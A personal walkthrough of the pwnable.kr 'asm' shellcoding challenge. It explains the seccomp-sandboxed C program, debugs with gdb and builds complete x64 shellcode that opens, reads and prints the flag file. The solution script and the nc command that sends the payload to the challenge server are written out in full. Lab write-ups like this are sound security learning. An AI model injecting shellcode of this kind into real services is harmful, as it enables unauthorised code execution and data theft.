- OK! Here we go again!
- There is some C code again, seems preety complicated - at least in comperasion to the other challanges
- There is a readme file, let's cat it:
- `once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)`

- Let's connect to the port:
`welcme to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :`

- There is also another file:
`cat this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong`

`this is fake flag file for letting you know the name of flag file.`

- Maybe inside the sandbox there is a file with this name..

- OK then, let's start digging in - I need to understand asm.c code first
- Seems like this challange idea is a sandbox, it uses something called seccomp - let's read about it
- Read about it - seccomp is a linux syscall, that allows a process to enter a "secure mode" - where only certain syscalls can be called from that point on, if it will attempt something else - it will be logged, or the process will be terminated - depends on the configuration 

- Let's document *EVERYTHING*
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

// Why is it here? it's not used anywhere..
#define LENGTH 128

void sandbox(){
	// seccomp is initilised - and it's configured with SCMP_ACT_KILL to kill the thread for any security viloation
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	// Now the rules are defined:
	// I can only call open, read, write, exit and exit_group syscalls
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	// Loading the seccomp filter to the kernel
	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	
	// Releases the seccomp filters BUT as the man says:
	// "Any seccomp filters loaded into the kernel are not affected"
	// So big oof
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0); // Set stdout as unbuffered (no buffer blocks)
	setvbuf(stdin, 0, _IOLBF, 0); // Set stdin as unbuffered

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	// Create a virtual memory mapping in the address 0x41414000 (if it's free)
	// for 0x1000 bytes. the protection is equal to 7 - which is not a valid option from what I saw(?)
	// MAP_FIXED - means the address spesifed must be used, otherwise it will fail
	// MAP_PRIVATE makes a copy-on-write that will not be carying changes to the underlying file
	// the fd is ignored because we are making a MAP_ANONYMOUS mapping
	// and the offset is 0 because there is no file to read from.
	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	
	// Write 0x90 to all of the memory we just mapped
	memset(sh, 0x90, 0x1000);
	
	// Copy the stub string to the memory we allocated (not sure what it does yet)
	memcpy(sh, stub, strlen(stub));
	
	// The offset is now the end of stub, so we won't overwrite it
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	
	// Read 1000 bytes from stdin into the memory we mapped (starting to write from the end of "stub")
	read(0, sh+offset, 1000);

	// Set an alarm - in 10 seconds SIGALRM will be send to the process
	// By default, SIGALRM causes the program to abnormally terminate with a user ABEND code of 1225.
	// It's actually a time bomb for the process 
	alarm(10);
	
	// OK we are getting chrooted - there are tricks to break it I belive, but for now let's let it be
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	
	// Now sandbox is called!
	sandbox();

	// ANDD the code is executed - starting with the stub code, then mine
	((void (*)(void))sh)();
	return 0;
}
```
- GREAT! Now I understand the code :)

- Some times has passed I am back in action! Let's start by understanding the stub code shall we? (SHELL WE HAHA)
- I disassmbled the hex values online and got this!
```
0:  48                      dec    eax
1:  31 c0                   xor    eax,eax
3:  48                      dec    eax
4:  31 db                   xor    ebx,ebx
6:  48                      dec    eax
7:  31 c9                   xor    ecx,ecx
9:  48                      dec    eax
a:  31 d2                   xor    edx,edx
c:  48                      dec    eax
d:  31 f6                   xor    esi,esi
f:  48                      dec    eax
10: 31 ff                   xor    edi,edi
12: 48                      dec    eax
13: 31 ed                   xor    ebp,ebp
15: 4d                      dec    ebp
16: 31 c0                   xor    eax,eax
18: 4d                      dec    ebp
19: 31 c9                   xor    ecx,ecx
1b: 4d                      dec    ebp
1c: 31 d2                   xor    edx,edx
1e: 4d                      dec    ebp
1f: 31 db                   xor    ebx,ebx
21: 4d                      dec    ebp
22: 31 e4                   xor    esp,esp
24: 4d                      dec    ebp
25: 31 ed                   xor    ebp,ebp
27: 4d                      dec    ebp
28: 31 f6                   xor    esi,esi
2a: 4d                      dec    ebp
2b: 31 ff                   xor    edi,edi 
```
- Looks like what this code is doing is simply zeroing the registers
- OK then, if so, I need to start writing code that I can execute that read the flag
- To be honest it seems pretty easy, I just need to use the read syscall on `this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong`

- I compiled a simple code:
```c
int main(int argc, char* argv[])
{
	int fd = 0;
	char buffer[10];
	fd = open("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong");
	read(fd, buffer, 10);
	write(1, buffer, 10);
	return 0;
}
```
- I also compiled asm.c localy to debug it before I run it on the pwnable server
- Got seg fault yay! Using gdb I saw that I try to run code that is not acutally code
`(gdb) x/i 0x0000000041414030
 => 0x41414030:	rex.WR`
- I probably need to compile the code as PIC or something like that
- I am having a bit of truble making the shellcode - debug time!
- Let's start by using x/i on the `sh` array before my shellcode is added to it
```
(gdb) x/30i sh
   0x41414000:	xor    rax,rax
   0x41414003:	xor    rbx,rbx
   0x41414006:	xor    rcx,rcx
   0x41414009:	xor    rdx,rdx
   0x4141400c:	xor    rsi,rsi
   0x4141400f:	xor    rdi,rdi
   0x41414012:	xor    rbp,rbp
   0x41414015:	xor    r8,r8
   0x41414018:	xor    r9,r9
   0x4141401b:	xor    r10,r10
   0x4141401e:	xor    r11,r11
   0x41414021:	xor    r12,r12
   0x41414024:	xor    r13,r13
   0x41414027:	xor    r14,r14
   0x4141402a:	xor    r15,r15
   0x4141402d:	nop
```
- Indeed, looks fine - the zeroing of the registers. Now let's see my code
```
(gdb) x/30i sh
   0x41414000:	xor    rax,rax
   0x41414003:	xor    rbx,rbx
   0x41414006:	xor    rcx,rcx
   0x41414009:	xor    rdx,rdx
   0x4141400c:	xor    rsi,rsi
   0x4141400f:	xor    rdi,rdi
   0x41414012:	xor    rbp,rbp
   0x41414015:	xor    r8,r8
   0x41414018:	xor    r9,r9
   0x4141401b:	xor    r10,r10
   0x4141401e:	xor    r11,r11
   0x41414021:	xor    r12,r12
   0x41414024:	xor    r13,r13
   0x41414027:	xor    r14,r14
   0x4141402a:	xor    r15,r15
   0x4141402d:	nop
   0x4141402e:	push   rbp
   0x4141402f:	rex.W
   0x41414030:	mov    QWORD PTR [rax-0x39],rcx
   0x41414034:	rex.W
   0x41414035:	movabs rax,0xb88948ba8b4889e8
   0x4141403f:	call   0x89fa8c
   0x41414044:	mov    eax,0xc3c9b8e8
   0x41414049:	nop
   0x4141404a:	nop
   0x4141404b:	nop
   0x4141404c:	nop
   0x4141404d:	nop
   0x4141404e:	nop
   0x4141404f:	nop
```

- Something is not working properly - I belive it will be easier to just write this in assembly!
```
...
```
- Now let's make it executable!
- `nasm -f elf32 payload.asm `
- `ld -m elf_i386 payload.o -o payload`
- Now I am able to run ./payload

- OK! I returned a few days later and made a lot of progress - let's write everything down.
- First of all - I need to compile my shellcode to 64bits - let's change that
- `nasm -f elf64 payload.asm `
- `ld -m elf_x86_64 payload.o -o payload`

- A few keys ideas for making a shellcode:
	+ Making sure there are no NULL bytes in the code
	+ Making sure you only leave the actual opcodes in and not the ELF headers and bla bla
	+ There are 2 ways to make syscalls - `int 0x80` (the OG) and `syscall`
		* They have diffrent registers as arguments and diffrent syscall numbers(!!!)
		* Here is a website with what you need: https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux
	+ If you have a constant string it won't work if it's not in the segmant as the code - and even than, the addresses are not PIC so it won't work well probably
		* The trick I use is `push <somevalue>` to the stack with the needed ascii values and then then using `rsp` as a pointer to a string (cool right?)

- In order to take `payload` and get an actuall shellcode out of it I tried a few things. The thing I liked most is this cute python script from git:
```python
from subprocess import Popen, PIPE
import sys
 
def shellcode_from_objdump(obj):
    res = ''
    p = Popen(['objdump', '-d', obj], stdout=PIPE, stderr=PIPE)
    (stdoutdata, stderrdata) = p.communicate()
    if p.returncode == 0:
        for line in stdoutdata.splitlines():
            cols = line.split('\t')
            if len(cols) > 2:
                for b in [b for b in cols[1].split(' ') if b != '']:
                    res = res + ('\\x%s' % b)
    else:
        raise ValueError(stderrdata)
 
    return res
 
 
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print 'Usage: %s <obj_file>' % sys.argv[0]
        sys.exit(2)
    else:
        print shellcode_from_objdump(sys.argv[1])
    sys.exit(0)

```
- It uses objdump to get the shellcode out, I use echo -ne to write it to a file like this:
- `echo -ne "$(python2 shellcoder.py payload)" > shellcode.bin`
- With all of the following I managed to inject a shellcode that writes "blabla string" from ./asm!
```
global _start

section	.text
_start:
	mov	dl,4		; message length
	xor rax,rax
	push rax        ; string terminator
    push 0x68732f6e ; "hs/n"
	mov	rsi,rsp		; message to write
	mov	rdi,1		; file descriptor (stdout)
	mov	al,1		; system call number (sys_write)
	syscall		    ; call kernel
	xor rax,rax
	mov	al,60       ;system call number (sys_exit)
    syscall         ;call kernel
```
- Now I just need to push to the stack the full name of the flag file, use the right syscalls and it's a win!
- Let's start by converting the flag name to hex so I can push it in the stack
- ```python
x = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

x.encode('ascii').hex()
'746869735f69735f70776e61626c652e6b725f666c61675f66696c655f706c656173655f726561645f746869735f66696c652e736f7272795f7468655f66696c655f6e616d655f69735f766572795f6c6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f303030303030303030303030303030303030303030303030306f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f3030303030303030303030306f306f306f306f306f306f306f6e67'
```

- Cool! let's try to build a shellcode that prints it
- First of all let's turn this little indian to big indian (online converter)
- Now let's use this code to make the pushes
```python
# Let's split this to pushable values:
for i in range(0,len(y),8):
    print('push 0x{}'.format(y[i:i+8]))

push rax        ; string terminator
push 0x676E6F30
push 0x6F306F30
push 0x6F306F30
push 0x6F306F30
push 0x30303030
push 0x30303030
push 0x3030306F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F3030
push 0x30303030
push 0x30303030
push 0x30303030
push 0x30303030
push 0x30303030
push 0x3030306F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6F
push 0x6F6F6F6C
push 0x5F797265
push 0x765F7369
push 0x5F656D61
push 0x6E5F656C
push 0x69665F65
push 0x68745F79
push 0x72726F73
push 0x2E656C69
push 0x665F7369
push 0x68745F64
push 0x6165725F
push 0x65736165
push 0x6C705F65
push 0x6C69665F
push 0x67616C66
push 0x5F726B2E
push 0x656C6261
push 0x6E77705F
push 0x73695F73
push 0x696874
```

- It worked! cool! Now let's build a shellcode that open a file and read from it!
- For reference - great site for syscalls docs https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ 

- Great! I MADE IT! Let's write a recap of important stuff I learned rn
	+ Using push 0xaabbccdd like this is pushing to the stack an extra 8 bytes of 0's
		* I managed to fix that by using push WORD 0xaabb instead - pushing every word by itself
	+ I had a problem - the string did not fit perfectly within a word size
	  ```
	  ...
	  push WORD 0x705F
	  push WORD 0x7369
	  push WORD 0x5F73
	  push WORD 0x6968
	  push WORD 0x74
	  ```
	    * What I did was changing `0x74` to `0x7474` - adding an extra 't' to the string
	    	- After that I used `add rsp,1` to make the pointer "skip" the extra 't' :)
	    	

- SO - final code
```
global _start

section	.text
_start:
	xor rax,rax
	push rax        ; string terminator
	push WORD 0x676E
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x6F30
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x306F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x3030
	push WORD 0x306F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6F
	push WORD 0x6F6C
	push WORD 0x5F79
	push WORD 0x7265
	push WORD 0x765F
	push WORD 0x7369
	push WORD 0x5F65
	push WORD 0x6D61
	push WORD 0x6E5F
	push WORD 0x656C
	push WORD 0x6966
	push WORD 0x5F65
	push WORD 0x6874
	push WORD 0x5F79
	push WORD 0x7272
	push WORD 0x6F73
	push WORD 0x2E65
	push WORD 0x6C69
	push WORD 0x665F
	push WORD 0x7369
	push WORD 0x6874
	push WORD 0x5F64
	push WORD 0x6165
	push WORD 0x725F
	push WORD 0x6573
	push WORD 0x6165
	push WORD 0x6C70
	push WORD 0x5F65
	push WORD 0x6C69
	push WORD 0x665F
	push WORD 0x6761
	push WORD 0x6C66
	push WORD 0x5F72
	push WORD 0x6B2E
	push WORD 0x656C
	push WORD 0x6261
	push WORD 0x6E77
	push WORD 0x705F
	push WORD 0x7369
	push WORD 0x5F73
	push WORD 0x6968
	push WORD 0x7474; here the value should have been 0x74 - BUT because it adds null to the program, I used anothe 't'
	add rsp,1       ; because of the extra 't' in the begining we add 1 to rsp to get rid of it!

	xor rsi,rsi     ; flags for sys_open - 0 is read only
	xor rdx,rdx     ; open mode - 0 is read
	mov rdi,rsp     ; file name - getting it from the stack
	mov	al,2        ; system call number (sys_open)
	syscall         ; call kernel

	mov rdi,rax     ; the fd to read from (rax holds the fd after open)
	mov rsi,rsp     ; the buffer to write to - I use the stack and overwrite the file name because I don't need it anymore
	mov rdx,100     ; number of bytes to read
	mov	al,0        ; system call number (sys_read)
	syscall         ; call kernel

	mov	rsi,rsp		; message to write
	mov	rdi,1		; file descriptor (stdout)
	xor rdx, rdx
	mov	rdx,100     ; message length (double the size because each letter takes 8 bytes)
	mov	al,1		; system call number (sys_write)
	syscall		    ; call kernel
	
	xor rax,rax
	mov	al,60       ; system call number (sys_exit)
    syscall         ; call kernel
```
- Let's make it bytecode and build a shellcode out of it
```bash
nasm -f elf64 payload.asm
ld -m elf_x86_64 payload.o -o payload
echo -ne "$(python2 shellcoder.py payload)" > shellcode.bin
```
- Andddd exploit!
`nc pwnable.kr 9026 < shellcode.bin`

# Mak1ng_shelLcodE_i5_veRy_eaSy
# pwned.
